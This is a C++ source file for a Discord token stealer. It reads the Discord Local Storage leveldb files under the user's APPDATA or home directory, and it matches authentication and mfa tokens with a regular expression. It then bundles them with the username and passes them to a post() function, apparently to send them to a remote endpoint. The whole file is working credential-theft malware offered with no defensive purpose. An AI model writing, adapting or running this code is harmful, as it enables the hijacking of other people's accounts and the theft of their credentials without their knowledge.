#ifdef __unix__
#elif defined(_WIN32) || defined(WIN32)
#define isWindows
#endif

#include "request.cpp"
#include "utils.cpp"

#include <sys/types.h>
#include <dirent.h>
#include <iostream>
#include <string>
#include <regex>

vector<string> tokens;

void lookfortoken(char *dir)
{
    string str = readfile(dir);
    regex regexp("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84})");
    smatch m;
    regex_search(str, m, regexp);

    for (auto x : m)
        tokens.push_back(x);

    sort(tokens.begin(), tokens.end());
    tokens.erase(unique(tokens.begin(), tokens.end()), tokens.end());

    // for (auto x : tokens)
    //     cout << x << endl;
}

void getdirs(const char *dbDir)
{
    struct dirent *en;
    DIR *dr = opendir(dbDir);
    if (dr)
    {
        while ((en = readdir(dr)) != NULL)
        {
            if (endswith(en->d_name, ".log") || endswith(en->d_name, ".ldb"))
            {
                char *dir = (char *)malloc(strlen((char *)dbDir) + strlen(en->d_name) + 1);
                strcpy(dir, (char *)dbDir);
                strcat(dir, en->d_name);
                lookfortoken(dir);
                free(dir);
            }
        }
        closedir(dr);
    }
}

int main(void)
{
    char *username = getenv("USER");

#ifdef isWindows
    string dbDir = "%APPDATA%/discord/Local Storage/leveldb/";
#else
    string dbDir = "/home/%USERNAME%/.config/discord/Local Storage/leveldb/";
#endif

#ifdef isWindows
    replace(dbDir, "%APPDATA%", getenv("APPDATA"));
#else
    replace(dbDir, "%USERNAME%", username);
#endif

    getdirs(dbDir.c_str());

    string top = "```All tokens from ";

    top.append(string(username).append("\n"));

    for (auto x : tokens)
        top.append(string((char *)x.c_str()).append("\n"));

    top.append("```");

    post(top.c_str());

    return 0;
}
